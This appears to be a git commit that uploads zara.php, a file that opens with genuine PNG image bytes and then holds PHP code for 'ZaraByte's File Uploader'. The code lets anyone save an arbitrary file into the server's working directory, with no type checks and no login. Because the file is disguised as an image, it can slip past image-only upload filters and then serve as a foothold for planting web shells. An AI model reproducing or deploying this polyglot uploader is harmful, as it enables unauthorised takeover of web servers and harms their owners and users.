ec4e63a06bdbe3d3bfe33968a6e3f3bf6618a0b3
HM <30953604+PakCyberPyrates@users.noreply.github.com>
2026-05-09 12:31:56 +0100

    Add files via upload

---
+++ zara.php
@@ -0,0 +1,109 @@
+‰PNG
+
+   
+IHDR   á   á   	m"H   œPLTEÿÿÿXQI*±µRKB®³UNFdÄÇQJAÓîïNF=ûþþ|ÍÐ’Ô×TMEXQHME<ìëê€{uÚÙ×ÈÆÃb\TôóóäãâÂÀ½ùùùííìŒ‡¥¢ž´±®ic\ËÉÇÒÐÎœ˜”¡™„z{vprleðúúf`X¯¬©¨ÞßŒˆƒ¼º·S¿Â¾æçåö÷è÷øžÙÛ>¹¼Çéê…ÐÓrÊÌêu¡  ¼IDATxœí]kw¢<–"Mc—‹Ü½ (T«m·Ýîÿÿo/ˆ’b2`÷=>vÏžãB2™[&“ÁàŽ;î¸ãŽ;î¸ãŽ;îø¿ ô&–o/NÁqKÛ·&^xëaÁ`bÛx—DEÑBãìOÝP6i²‹·=¹õ %0ñƒÕXÁ¦‰ªkšÂBÓt!ÓÄîxåøÞ­{5B>M]éUbuhÙ¯Ütº÷ÿ!¡µœ8EX­M[K
+a”ÆŽuë¡s ô÷kWWùÉQ4UÍ]ïý[3hFèL]$DïD¹SçÇŠk¸Œ
+S‚Þ‰¤iÄËŸHÒÖŠjHÒ;‘TÖÁOÓ®Ö<Â*½*Žæ?Iíø3·Y:¶ï`9\×=þ[m¶$šênŠÖñfti°™±ËL¾§³y9k–‹`>›Ž##3ø—M¦†7ÛŸ «ÞLÁçÇ¨©X‰Ö«½}YÜ,{¿ZGÆ%õ«aevkŽaž?MU•ÌO±'íJ1´ìù.RÔ³,5”7Õ«öëç'o=·¯YhÏ×>GRGc»³ñ·a+gô§®GSG$b˜8ÓH?óÁT%¾‘¨.R\µ††qˆ«ykŸàúªÖpº 7÷`¦uÕQº•÷¬mŠê6§½Ç‘‹Õ¥)ñD¼ 1jÒzžÆpV›@¤ïà4Âr­W? Ž·=*U\}¿ªLa5ž=­i14îÍÇYn*/×Íõþ-c“•Càßr³Š×Ð¸›5²WôªŽf¼ˆ…W$Tuç]™+oîV¤­:7V‚+
+ îruøqETñ¸c³a§ìGE©ÓíNÅ,©i§úÆŽ‚žv¦ZSSc?j‡~ê’µ‚(êÇ
+;3:îL¥:.ó1õ¤¯<ƒ•°¢ãvôe…&¨¡Y>FæCÑïÖN(²õM×*¦òv—^ Z—Œˆ¢¾Üò~f1ê.øûmFLÔqÿ1©Ç,F
+kT;¢…õ­e˜L™Y„µ‹cèQ|›äPÓþJ?sE@úpÏcFKäRa¾y;‚™Õ0©‘àÔsW´üßps0³L-QEfûéÑ€ØCÙ	C<R
+t|ªG 
+•Ñ2êTX‹ŽFòc9 œÒË«õõÉhøùòþëùï÷ë‡ôhrL2$me· Ä^ÄÔóË÷Ã°ÀÛ“ìxrxJÝ`IÕJÉÃ4WÌQzz>1üz•OÚGÖ%
+?í(!±hâã«$˜s¡èP’…¦2OZPV³/o4ÁdtÂŒÒ62!ÿ„’Q”ˆi­×
+Áá#„R
+)m£§âÞå­i‘XÊâåí¡ŠwáñPð#²q,ú[!ûƒ¦ Êzª~‹Ž‡CfÆŠá˜»ðr®
+i†7ÁGU@~u-¶‚"£â*ùWá—à£* •DžàÑON;uÇ–S=Q6”»¦ÆÂÃèNJ3EH­"Sæ‘ä¡¶÷à;Ó4|âÚhÊõ“HÅah.>ŠšÁ2ùÌ‰˜á«=p**Ô¥ò!ÝXü^¢9»Ö^S«PÔ¨Nân
+¯òÚ0Ê""®®åFÁzÞ žw‰1™D÷ºIœSž­l.ä‰Ìâ˜à`I†©^¥-<âõÉ'Œ~}ðÃ_˜	ï´«âsÊÑ öò,Æ3Tƒ-æØ„ëRHÕÌûG/¿?>>žž²?>~¿¼¼Œ
+È<²
+±¡RÒ­Oáèýñá”Ÿ9á¸ßáHŠ•¸CúXôÍ/ÏÃºÃV*œïÑçÖ@l"¿se\ˆ„œöÏù8>‹>·†€è…7ˆ"N»&œ xoâjø½´Ôû&oDbËë½½#FS˜O"ØR$î—ÊiÙ(—‹¾O-3€™F«4mšËíËo¢'¢o=V'ñ—è³k ºí¹þ±0zGzæ€/0uº×Oš‘Ï‡&N·h13mË0HVñ0âÒÇäs¿b_„]Òßõ,i]LáÆ®”:'Ò#æž[ùÖðôÕÎðáÌM%Û<F?,Í‹¦ïêÔ³3ç&,’²JEKÛ¾O¬‹xèû‡‡áÃ˜®YmÚn/ædÆÅPmÍ`~
+	Øq»½ vÅ#C>†pºÆ&ŽtÜöÛ	Y†"}	ïÆ"§%¦!±­ž4qÙÄmKS0Ó5¥½hwÜ‚rÍb‰<0/ÃG¨I$¹a½ÍÄ­ –!/C8÷Û&™³¶Œ2)î²
+ø‚íaXeŠ¾5+QîÇè‚»ŽpÏá×oñ—ÐK‹¨¹Í¿œ”_‘Li#7C°1©vÃÍÊÔ.¦ó2¸‚íÓìKGÅlÖÉùÃfðÏ!”®Y’7+Óm9Ù¦Ì˜On†P¡¾E„¯9·DoÊ¼Ÿ!”®	9ý¶ø‘ÌûÎÔ'\P¨_šu×dÈ¦ªx²;G+C’>Ê¼ˆ€Œ¼±.cAx¥_I`ê—I^­±ö‡¸rëm‡Od¥?eÞT¢Ì7ïèû¥ž‘<G”Ä‚¸ßÄ÷nŒ.ì’¡xª4G;Cê'C]}ù&K¾$ÿRmÖ"cHŽÃ¿2¯:Á!ÕCMÄJÕ'´ù4Cú7º†ì”ªMCw@¢CŽ½µŒáK©NAB}Â5‰Ã¶|iÎúo î7Q!÷¤CðäÁ-9ïCR 
+±]J¥Ûú`x¦º»Îdä ÒŠÔ6™(†m»kC²Cõ%¯k8¥j¶)Ó‚!5‰òºæj†¢åïGüæ‘ÒÁ fùÊhN]
+eƒïæb“#ÃR¥£DN{åÓdÚ”kGB>À >Þ$~D˜U)¿tÐbôOËš
+ùŒ}é—6.0¨Ø"Çûåª/Âð¨tÂ`ªæ»)¶€ŠøýyÑî†£ÃéË7yk±â‹¡bü#ÛF¾ÿ~d£8c|¨<MË¥_CðZaÞ<
+T®­@¯9smT¾ÔiŸyó¥P9ï}2¤rÞÍV€Ú·oÈÀËp h¸÷-€öž
+ð2|ÈEqï=MÊJíàd˜ýL>>$
+µc¸ {ÀøJgÛø÷€öñôÈÚÇo«Uƒ©Å(Ð#Ã+j1Hu©Ì¹ÊíG¯Ï¾¾ò¿dŽ™j<­­ž¦&ª@;Ã×ÓIšÃßõŠš(¤®­@;C&a%±áMÎÚq´ ©M,ÐÃkj)Ó)÷ÇðªúRáý1$5Âj{0UçmHZÄÞZåÂâR¤V_¼WDÞWÕêä·¤½èá•ç- ÎÌè‹áµgf@Î=ÐÃ}y“çQ`ˆ³kôÅ:»Æ7%ôùC)1í‰¡e–'fxû*3¤r=ûzbHº°pwG€8œ£†ê0ïvRHšïˆŸåôÅPä,7}?‘ÚzaŠœÇ§ûIÅ^ŠõT ûbH¸ß½0láA·jû`h“‚½«Üh˜þ4}0Ü=s]N¤ÇP…{1}¢„w{`H5ûr¯<µÑë«{†Žx¯/~m3¤ûµ]émå{îuÎ£@Ï eÅœ-Cªèš!Ý7Ñ3ùÞ—]3¤z´
+A”æ¤:fÈö/e{ÐŠ„ÂÝ2¤š©b=håûwËpG­"QçÙ¦nxésÒ)C§Ì]d£ö%ûywÉ¦Ÿ7Ó,Y¤';SFË”ñëK„2=ÙÅÔLÉ¾úté×'Ååt¾Y˜!ÝW_®ò‡¾áz“AõŸ¾¾N­ån¯(Ã ìn„ÊýW¬§«á÷ˆ´å!T2÷[$’[IÞQòtìÍzèùçøÏ2»õÉtÆä=’ÀÞQ"]¶Eäú $ð½þüz~>µf½?¿RUl£×¿¯œi=úžE•¾g†±ûbw1Y«íYG¼ÚÑ’¯ÜÊ-%?â¾'"T ÷=UîìÂ=ÞÍy!sEZãá‘+@_ù¤è·½–lÕÅ½kÙcÙ»ón7‹áª›»ó­mn9‹ÌªkÀ«B'ÌÕÑøÿw‡e¦PSFþoséŽÑÐ÷sWî’•qçQ¹*ßÎ½d®F›ÞïÞt|pæ¡óŠ~ïtº¿Ó9§È¼¤OÛßÏ½ÜEönu5^ëá÷t·z¶0=‹
+Šú‘Ô€¹’[ÑaîW=›}—†§ò§£Ú`íLFtP
+®EiøÌõÕùëºžÆ€q6²µm«˜Œ1óBÝŒ»|£?5™…¡àuçÎ†·b¿©¢ºó®Ì¿·uY‘QÐªWc†ØÏªá¤Ý¶H‘	ŒàM¡Wc©ûfs¯Þ–IE@5êÍ‘òÇIUte
+«áìRá§ q_ö7C¸Åµ÷ëk°/.×jíâm¿1Û"­AQ$€Pt“ QÔêÃQÒ·«?°¦µiÌ¼t&ëX³ÕŒo‘.ÓŠªSò°
+'{q’Ö>ÁgŠûŸÀ^\—¦\¥G;G„¤åì"µ6}Š¡*qÿñö	öº.ªŠ¡©ØXÏíkƒgÏ×
+VkÓ—KþºS?´A‚ÎK1tU‰vsÛj§Zö|gfï õ‰l£ix3¥¾rŠÑ©HÛ¬WûåEš¡µÜÇëvvòò'`e{;%ð¶ÑÙy<ŒQGØ4(™ÎæÁb¹´s,—N0_M“ašéÿ/Š~¿~æ!_ç‘¨ŠÔÃOŒÃ]ßÙô"õ"µ£¸ÛîƒO~Læ>£W…¡âtþ“øåƒÒ<‘ÜÐTeçÜv‹ëìØ0/®HnzÈTâÛÚ‡&„ÎÔE3™­Owºø‘ÓGàkW"™ý/wô!‰ÃZÄ)ÂHã§©eþ¬šÆ‹Ÿ¦\úû8uõËÆŽb§#ÍMã½ÿÃ…ó<ß™]”[õÌöU©j¹Ì¼ä®gŽÿS,»<ÛÙÆ»$Ýä9B™ôfÆ^3”Mšìâ¹cÿËÜ(„ÞÄò3wmá8ã,2çÍ·&Þ¿'–wÜqÇwÜqÇwÜqÇ%ü7q97i#    IEND®B`‚
+<?php
+$myUpload = new maxUpload();
+//$myUpload->setUploadLocation(getcwd().DIRECTORY_SEPARATOR);
+$myUpload->uploadFile();
+?>
+<?php
+class maxUpload{
+var $uploadLocation;
+
+function maxUpload(){
+$this->uploadLocation = getcwd().DIRECTORY_SEPARATOR;
+}
+
+function setUploadLocation($dir){
+$this->uploadLocation = $dir;
+}
+
+function showUploadForm($msg='',$error=''){
+?>
+<div id="container">
+<div id="header"><div id="header_left"></div>
+<div id="header_main">ZaraByte's File Uploader</div><div id="header_right"></div></div>
+<div id="content">
+<?php
+if ($msg != ''){
+echo '<p class="msg">'.$msg.'</p>';
+} else if ($error != ''){
+echo '<p class="emsg">'.$error.'</p>';
+
+}
+?>
+<form action="" method="post" enctype="multipart/form-data" >
+<center>
+<label>File:
+<input name="myfile" type="file" size="30" />
+</label>
+<label>
+<input type="submit" name="submitBtn" class="sbtn" value="Upload" />
+</label>
+</center>
+</form>
+</div>
+<div id="footer"><a href="http://www.zarabyte.com" target="_blank">ZaraByte File Uploader</a></div>
+</div>
+<?php
+}
+
+function uploadFile(){
+if (!isset($_POST['submitBtn'])){
+$this->showUploadForm();
+} else {
+$msg = '';
+$error = '';
+
+//Check destination directory
+if (!file_exists($this->uploadLocation)){
+$error = "The target directory doesn't exists!";
+} else if (!is_writeable($this->uploadLocation)) {
+$error = "The target directory is not writeable!";
+} else {
+$target_path = $this->uploadLocation . basename( $_FILES['myfile']['name']);
+
+if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
+$msg = basename( $_FILES['myfile']['name']).
+" was uploaded successfully!";
+} else{
+$error = "The upload process failed!";
+}
+}
+
+$this->showUploadForm($msg,$error);
+}
+
+}
+
+}
+?>
